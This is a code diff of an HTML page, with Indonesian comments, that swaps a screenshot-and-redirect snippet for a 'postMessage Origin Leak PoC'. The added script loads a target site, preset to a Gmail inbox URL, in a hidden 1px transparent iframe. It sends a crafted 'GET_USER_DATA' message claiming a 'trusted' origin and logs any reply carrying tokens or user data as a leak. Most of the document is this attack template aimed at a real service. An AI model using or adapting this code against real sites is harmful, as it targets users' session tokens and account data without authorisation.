@@ -2,26 +2,70 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Screenshot → Google</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<title>postMessage Origin Leak PoC</title>
+<style>
+body { font-family: Arial; text-align:center; margin-top:50px; }
+button { padding:15px 25px; font-size:16px; }
+pre { background:#111; color:#0f0; padding:10px; text-align:left; width:80%; margin:auto; }
+</style>
 </head>
 <body>
 
-<button id="btn">Start</button>
+<h2>postMessage Leak PoC</h2>
+<button id="start">Start Test</button>
+
+<pre id="log">Waiting...</pre>
 
 <script>
-document.getElementById("btn").onclick = async () => {
-
-  // 1️⃣ Screenshot
-  const canvas = await html2canvas(document.body);
-  const imgData = canvas.toDataURL("image/png");
-
-  // 2️⃣ Simpan di memory (sessionStorage)
-  sessionStorage.setItem("ss", imgData);
-
-  // 3️⃣ Redirect ke Google
-  window.location.href = "https://www.google.com";
+const log = (msg) => {
+    document.getElementById("log").innerText += "\n" + msg;
 };
+
+// 🎯 target iframe (contoh: app/webview yang rentan)
+const TARGET = "https://mail.google.com/mail/u/0/#inbox"; // ganti target
+
+let iframe;
+
+document.getElementById("start").onclick = () => {
+    log("[*] Creating iframe...");
+
+    iframe = document.createElement("iframe");
+    iframe.src = TARGET;
+    iframe.style.width = "1px";
+    iframe.style.height = "1px";
+    iframe.style.opacity = "0";
+
+    document.body.appendChild(iframe);
+
+    setTimeout(() => {
+        log("[*] Sending crafted message...");
+
+        iframe.contentWindow.postMessage({
+            cmd: "GET_USER_DATA",
+            origin: "trusted"
+        }, "*");
+
+    }, 2000);
+};
+
+// 🔥 Listener untuk data leak
+window.addEventListener("message", (e) => {
+    log("[+] Message received");
+
+    try {
+        log("Origin: " + e.origin);
+        log("Data: " + JSON.stringify(e.data, null, 2));
+
+        // 👉 bukti leak
+        if (e.data && (e.data.token || e.data.user)) {
+            document.body.style.background = "red";
+            log("🔥 POTENTIAL DATA LEAK DETECTED");
+        }
+
+    } catch(err) {
+        log("Error parsing message");
+    }
+});
 </script>
 
 </body>
